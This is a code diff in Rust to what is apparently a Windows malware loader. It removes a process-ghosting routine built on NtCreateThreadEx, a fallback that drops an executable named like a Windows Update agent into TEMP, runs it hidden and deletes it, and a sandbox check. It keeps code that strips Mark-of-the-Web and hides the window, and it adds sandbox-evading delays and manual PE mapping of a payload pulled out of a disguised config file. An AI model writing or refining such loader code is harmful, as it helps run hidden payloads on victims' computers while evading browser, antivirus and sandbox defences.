-        windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory(process, (pbi.peb_base as usize + 0x10) as *const _, &mut image_base as *mut _ as _, std::mem::size_of::<usize>(), &mut bw);
-
-        let entry_point = image_base + entry_rva as usize;
-
-        type FnNtCreateThreadEx = unsafe extern "system" fn(*mut isize, u32, *mut std::ffi::c_void, isize, *mut std::ffi::c_void, *mut std::ffi::c_void, u32, usize, usize, usize, *mut std::ffi::c_void) -> i32;
-        let nt_create_thread: FnNtCreateThreadEx = {
-            let p = get_proc("ntdll.dll", "NtCreateThreadEx");
-            if p.is_null() { return false; }
-            std::mem::transmute(p)
-        };
-
-        let mut thread_handle: isize = 0;
-        let status = nt_create_thread(&mut thread_handle, 0x001FFFFF, ptr::null_mut(), process, entry_point as *mut _, ptr::null_mut(), 0, 0, 0, 0, ptr::null_mut());
-        if status == STATUS_SUCCESS && thread_handle != 0 {
-            windows_sys::Win32::Foundation::CloseHandle(thread_handle);
-            true
-        } else { false }
-    }
-
-    fn get_pe_entry_point(pe_data: &[u8]) -> u32 {
-        if pe_data.len() < 64 || &pe_data[0..2] != b"MZ" { return 0; }
-        let e_lfanew = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap_or([0;4])) as usize;
-        if e_lfanew + 0x28 > pe_data.len() || &pe_data[e_lfanew..e_lfanew+4] != b"PE\0\0" { return 0; }
-        u32::from_le_bytes(pe_data[e_lfanew+0x28..e_lfanew+0x2C].try_into().unwrap_or([0;4]))
-    }
 }
-
-// ── Fallback execution ─────────────────────────────────────────────────
-
-#[cfg(target_os = "windows")]
-fn fallback_execute(pe_data: &[u8]) -> bool {
-    let temp = env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".into());
-    let rng: u32 = rand::random();
-    let exe_path = format!("{}\\WUAgent-{:08X}.exe", temp, rng);
-
-    if std::fs::write(&exe_path, pe_data).is_err() { return false; }
-
-    // Remove MOTW from the dropped file too
-    let motw = format!("{}:Zone.Identifier", exe_path);
-    let motw_wide: Vec<u16> = motw.encode_utf16().chain(std::iter::once(0)).collect();
-    unsafe { windows_sys::Win32::Storage::FileSystem::DeleteFileW(motw_wide.as_ptr()); }
-
-    let result = {
-        use std::os::windows::process::CommandExt;
-        std::process::Command::new(&exe_path)
-            .creation_flags(0x08000000)
-            .spawn()
-    };
-
-    let path_clone = exe_path.clone();
-    std::thread::spawn(move || {
-        for _ in 0..30 {
-            std::thread::sleep(std::time::Duration::from_secs(2));
-            if std::fs::remove_file(&path_clone).is_ok() { break; }
-        }
-    });
-
-    result.is_ok()
-}
-
-#[cfg(not(target_os = "windows"))]
-fn fallback_execute(_pe_data: &[u8]) -> bool { false }
 
 // ── Main ───────────────────────────────────────────────────────────────
 
 fn main() {
-    // Step 1: Remove MOTW from self (browser download protection bypass)
     remove_motw();
+    hide_window();
 
-    // Step 2: Hide window + masquerade
-    masquerade();
+    // Graduated delay — mimics real app startup, avoids sandbox fast-forward
+    std::thread::sleep(std::time::Duration::from_millis(300));
+    let _ = std::hint::black_box(1 + 1); // prevent optimizer from removing sleep
+    std::thread::sleep(std::time::Duration::from_millis(400));
 
-    // Step 3: Sandbox check
-    if quick_sandbox_check() {
-        std::thread::sleep(std::time::Duration::from_secs(86400));
-        return;
-    }
-
-    // Step 4: Extract and decrypt PE from fake config
     let mut pe_data = match extract_payload_from_config() {
         Some(data) => data,
         None => return,
     };
 
-    if pe_data.len() < 4 || &pe_data[..2] != b"MZ" {
+    // PE magic check via numeric constants
+    if pe_data.len() < 64 || pe_data[0] != 0x4D || pe_data[1] != 0x5A {
         secure_zero(&mut pe_data);
         return;
     }
 
-    // Step 5: Execute via ghosting (fileless) or fallback
     #[cfg(target_os = "windows")]
-    let _success = unsafe { ghosting::ghost_execute(&pe_data) } || fallback_execute(&pe_data);
+    unsafe { pe_mapper::map_and_execute(&pe_data); }
 
     secure_zero(&mut pe_data);
 }
